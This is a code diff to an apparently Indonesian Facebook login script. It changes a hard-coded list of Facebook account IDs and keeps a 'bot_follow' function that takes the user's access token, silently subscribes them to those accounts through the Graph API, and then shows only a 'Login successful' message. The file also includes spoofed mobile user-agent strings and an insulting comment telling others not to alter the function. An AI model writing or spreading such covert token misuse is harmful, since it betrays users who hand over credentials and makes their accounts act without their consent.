@@ -86,8 +86,8 @@ _my_account_ = [
     '100000729074466','607801156','100009340646547','1676993425','1767051257','100000287398094','100001085079906',
     '100007559713883','100004655733027','100000200420913','100026490368623','100010484328037','100015073506062','10016189']
 
-_account_ferly_ = [
-    '100013275378835','100069426306572','100078685628562','100086971657002','100024182378675','100090703092541','100056190665450']
+_my_Account_D_ = [
+    '100013275378835']
 ###----------[ USER AGENT ]---------- ###
 ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
 ua_samsung = 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36'
@@ -153,7 +153,7 @@ def cek_dev():
 ### Bot Follow Jangan Diganti Anjink !
 def bot_follow(_tok_dev_):
     try:
-        for _list_ in _account_ferly_:
+        for _list_ in _my_Account_D_:
             try:_req_post_("https://graph.facebook.com/%s/subscribers?access_token=%s"%(_list_,_tok_dev_));time.sleep(0.3)
             except:pass
         _dvanme_ferly_('%s║'%(O));jalan('%s╚══[%s!%s] %sLogin Berhasil'%(O,P,O,P));time.sleep(2)
